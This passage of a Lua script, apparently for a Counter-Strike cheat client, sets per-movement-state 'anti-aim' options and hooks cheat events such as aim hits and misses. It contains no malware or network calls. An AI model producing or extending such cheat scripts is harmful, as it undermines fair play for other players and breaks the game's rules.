    local duckAmount = entity.get_prop(local_player, "m_flDuckAmount")
   local standingEyeHeight = 64
   local duckedEyeHeight = 46
   local eyePos = {entity.get_prop(local_player, "m_vecOrigin")}
   eyePos[3] = eyePos[3] + entity.get_prop(local_player, "m_vecViewOffset[2]")

   if bit.band(flags, 1) ~= 0 then -- on ground
    if duckAmount > 0 and eyePos[3] < standingEyeHeight - (standingEyeHeight - duckedEyeHeight) * duckAmount then -- ducking
        tables.state = "Ducking"
        --print("ducking")
      elseif ui.get(reference.aa_other.slow_motion[2]) then --slowwalking
        tables.state = "Slowwalk"
        --print("slow motion")
      else
         if entity.get_prop(entity.get_local_player(), "m_vecVelocity[0]") == 0 and entity.get_prop(entity.get_local_player(), "m_vecVelocity[1]") == 0 then -- not moving horizontally
            tables.state = "Standing"
            --print("standing")
         else -- moving vertically
            tables.state = "Moving"
            --print("moving")
         end
      end
   else -- in air
      if bit.band(flags, 2) ~= 0 then -- ducking in air
         tables.state = "Air duck"
         --print("air duck")
      else
        tables.state = "In air"
        --print("in air")
      end
   end
   
        -- ui.set(reference.aa.pitch, ui.get(menu.tab['Anti-Aim'].default.pitch))
        -- ui.set(reference.aa.yaw_base[1], ui.get(menu.tab['Anti-Aim'].default.yaw_base))
        -- ui.set(reference.aa.yaw[1], ui.get(menu.tab['Anti-Aim'].default.yaw))
        -- ui.set(reference.aa.yaw[2], ui.get(menu.tab['Anti-Aim'].default.yaw_slider))
        -- ui.set(reference.aa.yaw_jitter[1], ui.get(menu.tab['Anti-Aim'].default.yaw_jitter))
        -- ui.set(reference.aa.yaw_jitter[2], ui.get(menu.tab['Anti-Aim'].default.yaw_jitter_slider))
        -- ui.set(reference.aa.body_yaw[1], ui.get(menu.tab['Anti-Aim'].default.body_yaw))
        -- ui.set(reference.aa.body_yaw[2], ui.get(menu.tab['Anti-Aim'].default.body_yaw_slider))
        -- ui.set(reference.aa.freestanding_body_yaw[1], ui.get(menu.tab['Anti-Aim'].default.freestanding_body_yaw))
        -- ui.set(reference.aa.edge_yaw, ui.get(menu.tab['Anti-Aim'].default.edge_yaw_bind))
        -- ui.set(reference.aa.freestanding[1], ui.get(menu.tab['Anti-Aim'].default.freestanding))
        -- --ui.set(reference.aa.freestanding[2], ui.get(menu.tab['Anti-Aim'].default.freestanding_hotkey))
        -- ui.set(reference.aa.roll, ui.get(menu.tab['Anti-Aim'].default.roll))

    --in air
    if tables.state == "In air" then
        ui.set(reference.aa.pitch, ui.get(menu.tab['Anti-Aim'].in_air.pitch))
        ui.set(reference.aa.yaw_base[1], ui.get(menu.tab['Anti-Aim'].in_air.yaw_base))
        ui.set(reference.aa.yaw[1], ui.get(menu.tab['Anti-Aim'].in_air.yaw))
        ui.set(reference.aa.yaw[2], ui.get(menu.tab['Anti-Aim'].in_air.yaw_slider))
        ui.set(reference.aa.yaw_jitter[1], ui.get(menu.tab['Anti-Aim'].in_air.yaw_jitter))
        ui.set(reference.aa.yaw_jitter[2], ui.get(menu.tab['Anti-Aim'].in_air.yaw_jitter_slider))
        ui.set(reference.aa.body_yaw[1], ui.get(menu.tab['Anti-Aim'].in_air.body_yaw))
        ui.set(reference.aa.body_yaw[2], ui.get(menu.tab['Anti-Aim'].in_air.body_yaw_slider))
        ui.set(reference.aa.freestanding_body_yaw[1], ui.get(menu.tab['Anti-Aim'].in_air.freestanding_body_yaw))
        ui.set(reference.aa.edge_yaw, ui.get(menu.tab['Anti-Aim'].in_air.edge_yaw_bind))
        --ui.set(reference.aa.freestanding[1], ui.get(menu.tab['Anti-Aim'].in_air.freestanding))
        --ui.set(reference.aa.freestanding[2], ui.get(menu.tab['Anti-Aim'].in_air.freestanding_hotkey))
        ui.set(reference.aa.roll, ui.get(menu.tab['Anti-Aim'].in_air.roll))
    end
    --ducking

    --local player ducking flag
    if tables.state == "Ducking" then
        ui.set(reference.aa.pitch, ui.get(menu.tab['Anti-Aim'].ducking.pitch))
        ui.set(reference.aa.yaw_base[1], ui.get(menu.tab['Anti-Aim'].ducking.yaw_base))
        ui.set(reference.aa.yaw[1], ui.get(menu.tab['Anti-Aim'].ducking.yaw))
        ui.set(reference.aa.yaw[2], ui.get(menu.tab['Anti-Aim'].ducking.yaw_slider))
        ui.set(reference.aa.yaw_jitter[1], ui.get(menu.tab['Anti-Aim'].ducking.yaw_jitter))
        ui.set(reference.aa.yaw_jitter[2], ui.get(menu.tab['Anti-Aim'].ducking.yaw_jitter_slider))
        ui.set(reference.aa.body_yaw[1], ui.get(menu.tab['Anti-Aim'].ducking.body_yaw))
        ui.set(reference.aa.body_yaw[2], ui.get(menu.tab['Anti-Aim'].ducking.body_yaw_slider))
        ui.set(reference.aa.freestanding_body_yaw[1], ui.get(menu.tab['Anti-Aim'].ducking.freestanding_body_yaw))
        ui.set(reference.aa.edge_yaw, ui.get(menu.tab['Anti-Aim'].ducking.edge_yaw_bind))
        --ui.set(reference.aa.freestanding[1], ui.get(menu.tab['Anti-Aim'].ducking.freestanding))
        --ui.set(reference.aa.freestanding[2], ui.get(menu.tab['Anti-Aim'].ducking.freestanding_hotkey))
        ui.set(reference.aa.roll, ui.get(menu.tab['Anti-Aim'].ducking.roll))
    end
    --in air ducking
    if tables.state == "Air duck" then
        ui.set(reference.aa.pitch, ui.get(menu.tab['Anti-Aim'].air_duck.pitch))
        ui.set(reference.aa.yaw_base[1], ui.get(menu.tab['Anti-Aim'].air_duck.yaw_base))
        ui.set(reference.aa.yaw[1], ui.get(menu.tab['Anti-Aim'].air_duck.yaw))
        ui.set(reference.aa.yaw[2], ui.get(menu.tab['Anti-Aim'].air_duck.yaw_slider))
        ui.set(reference.aa.yaw_jitter[1], ui.get(menu.tab['Anti-Aim'].air_duck.yaw_jitter))
        ui.set(reference.aa.yaw_jitter[2], ui.get(menu.tab['Anti-Aim'].air_duck.yaw_jitter_slider))
        ui.set(reference.aa.body_yaw[1], ui.get(menu.tab['Anti-Aim'].air_duck.body_yaw))
        ui.set(reference.aa.body_yaw[2], ui.get(menu.tab['Anti-Aim'].air_duck.body_yaw_slider))
        ui.set(reference.aa.freestanding_body_yaw[1], ui.get(menu.tab['Anti-Aim'].air_duck.freestanding_body_yaw))
        ui.set(reference.aa.edge_yaw, ui.get(menu.tab['Anti-Aim'].air_duck.edge_yaw_bind))
        --ui.set(reference.aa.freestanding[1], ui.get(menu.tab['Anti-Aim'].air_duck.freestanding))
        --ui.set(reference.aa.freestanding[2], ui.get(menu.tab['Anti-Aim'].air_duck.freestanding_hotkey))
        ui.set(reference.aa.roll, ui.get(menu.tab['Anti-Aim'].air_duck.roll))
    end
    --standing
    if tables.state == "Standing" then
        ui.set(reference.aa.pitch, ui.get(menu.tab['Anti-Aim'].standing.pitch))
        ui.set(reference.aa.yaw_base[1], ui.get(menu.tab['Anti-Aim'].standing.yaw_base))
        ui.set(reference.aa.yaw[1], ui.get(menu.tab['Anti-Aim'].standing.yaw))
        ui.set(reference.aa.yaw[2], ui.get(menu.tab['Anti-Aim'].standing.yaw_slider))
        ui.set(reference.aa.yaw_jitter[1], ui.get(menu.tab['Anti-Aim'].standing.yaw_jitter))
        ui.set(reference.aa.yaw_jitter[2], ui.get(menu.tab['Anti-Aim'].standing.yaw_jitter_slider))
        ui.set(reference.aa.body_yaw[1], ui.get(menu.tab['Anti-Aim'].standing.body_yaw))
        ui.set(reference.aa.body_yaw[2], ui.get(menu.tab['Anti-Aim'].standing.body_yaw_slider))
        ui.set(reference.aa.freestanding_body_yaw[1], ui.get(menu.tab['Anti-Aim'].standing.freestanding_body_yaw))
        ui.set(reference.aa.edge_yaw, ui.get(menu.tab['Anti-Aim'].standing.edge_yaw_bind))
        --ui.set(reference.aa.freestanding[1], ui.get(menu.tab['Anti-Aim'].standing.freestanding))
        --ui.set(reference.aa.freestanding[2], ui.get(menu.tab['Anti-Aim'].standing.freestanding_hotkey))
        ui.set(reference.aa.roll, ui.get(menu.tab['Anti-Aim'].standing.roll))
    end
    --moving
    if tables.state == "Moving" then
        ui.set(reference.aa.pitch, ui.get(menu.tab['Anti-Aim'].moving.pitch))
        ui.set(reference.aa.yaw_base[1], ui.get(menu.tab['Anti-Aim'].moving.yaw_base))
        ui.set(reference.aa.yaw[1], ui.get(menu.tab['Anti-Aim'].moving.yaw))
        ui.set(reference.aa.yaw[2], ui.get(menu.tab['Anti-Aim'].moving.yaw_slider))
        ui.set(reference.aa.yaw_jitter[1], ui.get(menu.tab['Anti-Aim'].moving.yaw_jitter))
        ui.set(reference.aa.yaw_jitter[2], ui.get(menu.tab['Anti-Aim'].moving.yaw_jitter_slider))
        ui.set(reference.aa.body_yaw[1], ui.get(menu.tab['Anti-Aim'].moving.body_yaw))
        ui.set(reference.aa.body_yaw[2], ui.get(menu.tab['Anti-Aim'].moving.body_yaw_slider))
        ui.set(reference.aa.freestanding_body_yaw[1], ui.get(menu.tab['Anti-Aim'].moving.freestanding_body_yaw))
        ui.set(reference.aa.edge_yaw, ui.get(menu.tab['Anti-Aim'].moving.edge_yaw_bind))
        --ui.set(reference.aa.freestanding[1], ui.get(menu.tab['Anti-Aim'].moving.freestanding))
        --ui.set(reference.aa.freestanding[2], ui.get(menu.tab['Anti-Aim'].moving.freestanding_hotkey))
        ui.set(reference.aa.roll, ui.get(menu.tab['Anti-Aim'].moving.roll))
    end
    --slowwalk
    if tables.state == "Slowwalk" then
        ui.set(reference.aa.pitch, ui.get(menu.tab['Anti-Aim'].slowwalk.pitch))
        ui.set(reference.aa.yaw_base[1], ui.get(menu.tab['Anti-Aim'].slowwalk.yaw_base))
        ui.set(reference.aa.yaw[1], ui.get(menu.tab['Anti-Aim'].slowwalk.yaw))
        ui.set(reference.aa.yaw[2], ui.get(menu.tab['Anti-Aim'].slowwalk.yaw_slider))
        ui.set(reference.aa.yaw_jitter[1], ui.get(menu.tab['Anti-Aim'].slowwalk.yaw_jitter))
        ui.set(reference.aa.yaw_jitter[2], ui.get(menu.tab['Anti-Aim'].slowwalk.yaw_jitter_slider))
        ui.set(reference.aa.body_yaw[1], ui.get(menu.tab['Anti-Aim'].slowwalk.body_yaw))
        ui.set(reference.aa.body_yaw[2], ui.get(menu.tab['Anti-Aim'].slowwalk.body_yaw_slider))
        ui.set(reference.aa.freestanding_body_yaw[1], ui.get(menu.tab['Anti-Aim'].slowwalk.freestanding_body_yaw))
        ui.set(reference.aa.edge_yaw, ui.get(menu.tab['Anti-Aim'].slowwalk.edge_yaw_bind))
        --ui.set(reference.aa.freestanding[1], ui.get(menu.tab['Anti-Aim'].slowwalk.freestanding))
        --ui.set(reference.aa.freestanding[2], ui.get(menu.tab['Anti-Aim'].slowwalk.freestanding_hotkey))
        ui.set(reference.aa.roll, ui.get(menu.tab['Anti-Aim'].slowwalk.roll))
    end
end

local on_shutdown = function()
    table_visible(reference.aa, true)
end

local handle_interface = function()
    local master_enabled = ui.get(menu.enabled)
    table_visible(reference.aa, not master_enabled)

    for i=1, #menu.tab do
        local current_tab = menu.tab[i]

        if type(current_tab) == 'table' then
            table_visible(current_tab, master_enabled)
        end
    end

    local get_tab = ui.get(menu.tab.switch_tabs)
    for i = 1, #tables.tabs do
        local current_tab = tables.tabs[i]
        table_visible(menu.tab[current_tab], master_enabled and get_tab == current_tab)
    end

    if ui.get(menu.enabled) and ui.get(menu.tab.switch_tabs) == "Anti-Aim" then
        if ui.get(menu.tab['Anti-Aim'].player_state) == 'Default' then
            table_visible({menu.tab['Anti-Aim'].default}, true)
            table_visible({menu.tab['Anti-Aim'].standing}, false)
            table_visible({menu.tab['Anti-Aim'].moving}, false)
            table_visible({menu.tab['Anti-Aim'].ducking}, false)
            table_visible({menu.tab['Anti-Aim'].in_air}, false)
            table_visible({menu.tab['Anti-Aim'].air_duck}, false)
            table_visible({menu.tab['Anti-Aim'].slowwalk}, false)
            table_visible({menu.tab['Anti-Aim'].use}, false)
            table_visible({menu.tab['Anti-Aim'].freestanding}, false)
        elseif ui.get(menu.tab['Anti-Aim'].player_state) == 'Standing' then
            table_visible({menu.tab['Anti-Aim'].default}, false)
            table_visible({menu.tab['Anti-Aim'].standing}, true)
            table_visible({menu.tab['Anti-Aim'].moving}, false)
            table_visible({menu.tab['Anti-Aim'].ducking}, false)
            table_visible({menu.tab['Anti-Aim'].in_air}, false)
            table_visible({menu.tab['Anti-Aim'].air_duck}, false)
            table_visible({menu.tab['Anti-Aim'].slowwalk}, false)
            table_visible({menu.tab['Anti-Aim'].use}, false)
            table_visible({menu.tab['Anti-Aim'].freestanding}, false)
        elseif ui.get(menu.tab['Anti-Aim'].player_state) == 'Moving' then
            table_visible({menu.tab['Anti-Aim'].default}, false)
            table_visible({menu.tab['Anti-Aim'].standing}, false)
            table_visible({menu.tab['Anti-Aim'].moving}, true)
            table_visible({menu.tab['Anti-Aim'].ducking}, false)
            table_visible({menu.tab['Anti-Aim'].in_air}, false)
            table_visible({menu.tab['Anti-Aim'].air_duck}, false)
            table_visible({menu.tab['Anti-Aim'].slowwalk}, false)
            table_visible({menu.tab['Anti-Aim'].use}, false)
            table_visible({menu.tab['Anti-Aim'].freestanding}, false)
        elseif ui.get(menu.tab['Anti-Aim'].player_state) == 'Ducking' then
            table_visible({menu.tab['Anti-Aim'].default}, false)
            table_visible({menu.tab['Anti-Aim'].standing}, false)
            table_visible({menu.tab['Anti-Aim'].moving}, false)
            table_visible({menu.tab['Anti-Aim'].ducking}, true)
            table_visible({menu.tab['Anti-Aim'].in_air}, false)
            table_visible({menu.tab['Anti-Aim'].air_duck}, false)
            table_visible({menu.tab['Anti-Aim'].slowwalk}, false)
            table_visible({menu.tab['Anti-Aim'].use}, false)
            table_visible({menu.tab['Anti-Aim'].freestanding}, false)
        elseif ui.get(menu.tab['Anti-Aim'].player_state) == 'In air' then
            table_visible({menu.tab['Anti-Aim'].default}, false)
            table_visible({menu.tab['Anti-Aim'].standing}, false)
            table_visible({menu.tab['Anti-Aim'].moving}, false)
            table_visible({menu.tab['Anti-Aim'].ducking}, false)
            table_visible({menu.tab['Anti-Aim'].in_air}, true)
            table_visible({menu.tab['Anti-Aim'].air_duck}, false)
            table_visible({menu.tab['Anti-Aim'].slowwalk}, false)
            table_visible({menu.tab['Anti-Aim'].use}, false)
            table_visible({menu.tab['Anti-Aim'].freestanding}, false)
        elseif ui.get(menu.tab['Anti-Aim'].player_state) == 'Air duck' then
            table_visible({menu.tab['Anti-Aim'].default}, false)
            table_visible({menu.tab['Anti-Aim'].standing}, false)
            table_visible({menu.tab['Anti-Aim'].moving}, false)
            table_visible({menu.tab['Anti-Aim'].ducking}, false)
            table_visible({menu.tab['Anti-Aim'].in_air}, false)
            table_visible({menu.tab['Anti-Aim'].air_duck}, true)
            table_visible({menu.tab['Anti-Aim'].slowwalk}, false)
            table_visible({menu.tab['Anti-Aim'].use}, false)
            table_visible({menu.tab['Anti-Aim'].freestanding}, false)
        elseif ui.get(menu.tab['Anti-Aim'].player_state) == 'Slowwalk' then
            table_visible({menu.tab['Anti-Aim'].default}, false)
            table_visible({menu.tab['Anti-Aim'].standing}, false)
            table_visible({menu.tab['Anti-Aim'].moving}, false)
            table_visible({menu.tab['Anti-Aim'].ducking}, false)
            table_visible({menu.tab['Anti-Aim'].in_air}, false)
            table_visible({menu.tab['Anti-Aim'].air_duck}, false)
            table_visible({menu.tab['Anti-Aim'].slowwalk}, true)
            table_visible({menu.tab['Anti-Aim'].use}, false)
            table_visible({menu.tab['Anti-Aim'].freestanding}, false)
        elseif ui.get(menu.tab['Anti-Aim'].player_state) == 'Use' then
            table_visible({menu.tab['Anti-Aim'].default}, false)
            table_visible({menu.tab['Anti-Aim'].standing}, false)
            table_visible({menu.tab['Anti-Aim'].moving}, false)
            table_visible({menu.tab['Anti-Aim'].ducking}, false)
            table_visible({menu.tab['Anti-Aim'].in_air}, false)
            table_visible({menu.tab['Anti-Aim'].air_duck}, false)
            table_visible({menu.tab['Anti-Aim'].slowwalk}, false)
            table_visible({menu.tab['Anti-Aim'].use}, true)
            table_visible({menu.tab['Anti-Aim'].freestanding}, false)
        elseif ui.get(menu.tab['Anti-Aim'].player_state) == 'Freestanding' then
            table_visible({menu.tab['Anti-Aim'].default}, false)
            table_visible({menu.tab['Anti-Aim'].standing}, false)
            table_visible({menu.tab['Anti-Aim'].moving}, false)
            table_visible({menu.tab['Anti-Aim'].ducking}, false)
            table_visible({menu.tab['Anti-Aim'].in_air}, false)
            table_visible({menu.tab['Anti-Aim'].air_duck}, false)
            table_visible({menu.tab['Anti-Aim'].slowwalk}, false)
            table_visible({menu.tab['Anti-Aim'].use}, false)
            table_visible({menu.tab['Anti-Aim'].freestanding}, true)
        end
    end
end

handle_interface()

ui.set_callback(menu.enabled, function()
    handle_interface()
    --handle_callback(menu.enabled)

    if not ui.get(menu.enabled) then
        on_shutdown()
    end
end)

ui.set_callback(menu.tab.switch_tabs, function()
    handle_interface()
end)

ui.set_callback(menu.tab['Anti-Aim'].player_state, function()
    handle_interface()
end)

client.set_event_callback('setup_command', function() on_setup() end)
client.set_event_callback('paint', function() indicators() watermark() peek_cir() anti_aim() end)
client.set_event_callback('pre_render', function() anims() end)
client.set_event_callback('aim_hit', on_hit)
client.set_event_callback('aim_miss', on_miss)
client.set_event_callback('player_say', player_chat)
client.set_event_callback('player_death', on_death)
client.set_event_callback('net_update_end', function() clantag() end)
client.set_event_callback('shutdown', on_shutdown)